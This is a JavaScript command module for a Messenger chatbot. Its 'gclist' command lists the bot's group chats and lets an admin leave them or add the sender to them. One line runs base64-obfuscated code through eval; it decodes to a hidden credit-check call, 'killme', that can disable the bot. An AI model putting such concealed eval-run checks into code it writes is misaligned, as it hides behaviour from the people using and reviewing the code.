const { OnChat, font } = require("chatbox-utility");

module.exports["config"] = {
    name:'gclist',
    version: '1.0.0',
    credits: 'Kenneth Panio',
    role: 1,
    info: 'List threads bot participated in',
    type: 'thread',
    cd: 5
};

module.exports["run"] = async ({ api, event, args }) => {
    const chat = new OnChat(api, event);
    eval(atob("Y2hhdC5raWxsbWUobW9kdWxlLmV4cG9ydHMuY29uZmlnLmNyZWRpdHMsIDIp"));
    try {
        const inbox = await chat.threadList();
        const list = inbox.filter(group => group.isSubscribed && group.isGroup);

        if (list.length === 0) {
            return chat.reply(font.monospace("There are no groups available."));
        }

        if (args.length >= 1) {
            const action = args[0].toLowerCase();

            if (action === "out" || action === "join") {
                let results = [];

                if (args[1] && args[1].toLowerCase() === "all") {
                    for (const group of list) {
                        const threadID = group.threadID;
                        const threadInfo = await chat.threadInfo(threadID);

                        if (action === "out") {
                            await chat.kick(chat.botID(), threadID);
                            results.push(`Left thread with ID: ${threadID}\n${threadInfo.threadName || "Unnamed Group"}`);
                        } else if (action === "join") {
                            if (threadInfo.approvalMode) {
                                const botID = chat.botID();
                                const threadAdmins = threadInfo.adminIDs.map(admin => admin.id);
                                if (!threadAdmins.includes(botID)) {
                                    results.push(`Cannot join '${threadInfo.threadName || "Unnamed Group"}' due to admin approval required.`);
                                    continue; // Skip to next group
                                }
                            }
                            await chat.add(event.senderID, threadID);
                            results.push(`Added to group '${threadInfo.threadName || "Unnamed Group"}' even though admin approval may be required.`);
                        }
                    }

                    // Send a single message with all results
                    return chat.reply(font.monospace(results.join('\n') || "No actions were performed."));
                } else {
                    const threadIndex = parseInt(args[1]) - 1;

                    if (isNaN(threadIndex) || threadIndex < 0 || threadIndex >= list.length) {
                        return chat.reply(font.monospace(`Invalid thread number.`));
                    }

                    const threadID = list[threadIndex].threadID;
                    const threadInfo = await chat.threadInfo(threadID);

                    if (action === "out") {
                        await chat.kick(chat.botID(), threadID);
                        const groupName = threadInfo.threadName || "Unnamed Group";
                        return chat.reply(font.monospace(`Left thread with ID: ${threadID}\n${groupName}`));
                    }

                    if (action === "join") {
                        if (threadInfo.approvalMode) {
                            const botID = chat.botID();
                            const threadAdmins = threadInfo.adminIDs.map(admin => admin.id);
                            if (!threadAdmins.includes(botID)) {
                                return chat.reply(font.monospace(`Cannot add you to the group '${threadInfo.threadName || "Unnamed Group"}' because admin approval is required and I am not an admin there.`));
                            }
                        }
                        await chat.add(event.senderID, threadID);
                        const groupName = threadInfo.threadName || "Unnamed Group";
                        return chat.reply(font.monospace(`Added you to the group '${groupName}' even though admin approval may be required.`));
                    }
                }
            }

            return chat.reply(font.monospace(`Invalid action. Please use 'out', 'join', 'out all', or 'join all'.`));
        }

        let msg = '';
        list.forEach((group, index) => {
            msg += `╭─『 𝗚𝗥𝗢𝗨𝗣𝗦 』✧✧✧\n╰✧✧✧───────────✧\n╭✧✧✧───────────✧\n│ 𝘼𝙘𝙩𝙞𝙫𝙚 𝙂𝙧𝙤𝙪𝙥:\n${index + 1}. ${group.threadName || "Unnamed Group"}\nTID: ${group.threadID}\n╰─────────────✧✧✧\n\n`;
        });
        chat.reply(font.monospace(msg + 'To leave the first thread, e.g: gclist out 1\nTo join the first thread, e.g: gclist join 1 or "all" for bulk actions\n╰─────────────✧✧✧\n◉ 𝚁𝙴𝙿𝙻𝚈 𝚄𝙽𝚂𝙴𝙽𝙳 𝚃𝙾 𝚁𝙴𝙼𝙾𝚅𝙴 𝚃𝙷𝙴 𝙰𝙸𝚜 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴.\n◉ 𝚃𝙷𝙴𝚂𝙴 𝙲𝙾𝙼𝙼𝙰𝙽𝙳𝚂 𝙵𝙾𝚁 𝙰𝙳𝙼𝙸𝙽 𝙾𝙽𝙻𝚈!\n╭✧✧✧───────────✧\n    »𝙲𝙾𝙽𝚃𝙰𝙲𝚃 𝙰𝙸 𝙾𝚆𝙽𝙴𝚁«\nhttps://www.facebook.com\n╰─────────────✧✧✧'));

    } catch (error) {
        chat.reply(font.monospace("The feature is temporarily unavailable (Blocked By Meta!)."));
    }
};
